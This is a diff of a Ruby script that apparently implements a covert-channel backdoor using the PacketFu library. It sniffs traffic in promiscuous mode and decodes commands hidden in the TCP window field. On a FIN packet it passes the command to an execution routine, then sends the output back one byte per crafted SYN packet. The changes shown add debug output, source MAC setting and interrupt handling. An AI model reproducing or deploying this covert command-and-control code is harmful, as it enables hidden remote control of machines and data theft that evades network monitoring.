@@ -25,19 +25,20 @@ end
 #
 # -----------------------------------------------------------------------------------------
 def listen()
-
 	cap = PacketFu::Capture.new(:iface => @options[:iface], :start => true, :filter => @options[:filter], :promisc => true)
 	command = nil
+
 	cap.stream.each do | pkt |
-	
+
 		if PacketFu::TCPPacket.can_parse?(pkt) then
+
 			packet = PacketFu::Packet.parse(pkt)
 
 				# if a FIN comes in then we have our complete command
 				if packet.tcp_flags.fin == 1 then
-
+                    puts command
                     exec_command(command, packet)
-				
+				    
 				else #not a fin packet recieved
 					if command.nil? then
 						command = decode(packet.tcp_win)
@@ -89,11 +90,13 @@ end
 def send_data(string, packet)
 
 	pkt = PacketFu::TCPPacket.new
-
+    puts string
 	#send the data
 	string.each_byte do |char|
+	    pkt.eth_saddr = @options[:ifconfig][:eth_saddr]				
 		pkt.ip_daddr = packet.ip_saddr #the servers ip
 		pkt.ip_saddr = packet.ip_daddr #the senders ip
+
 		pkt.tcp_flags = PacketFu::TcpFlags.new(:syn => 1)	
 		pkt.tcp_win = char
 		pkt.recalc
@@ -102,6 +105,7 @@ def send_data(string, packet)
 	
 	#send a FIN to indicate completion
 	pkt_f = PacketFu::TCPPacket.new
+	pkt_f.eth_saddr = @options[:ifconfig][:eth_saddr]
 	pkt_f.ip_daddr = packet.ip_saddr #the servers ip
 	pkt_f.ip_saddr = packet.ip_daddr #the senders ip
 	pkt_f.tcp_flags = PacketFu::TcpFlags.new(:fin => 1)
@@ -146,7 +150,11 @@ if @options[:filter] == '' then
 	@options[:filter] ="tcp dst port " + @options[:port]
 
 end
-puts @options[:filter]
-listen()
+@options[:ifconfig] = PacketFu::Utils.whoami?(:iface => @options[:iface])
+begin
+    listen()
+rescue Interrupt => e
+    exit()
+end
 
 
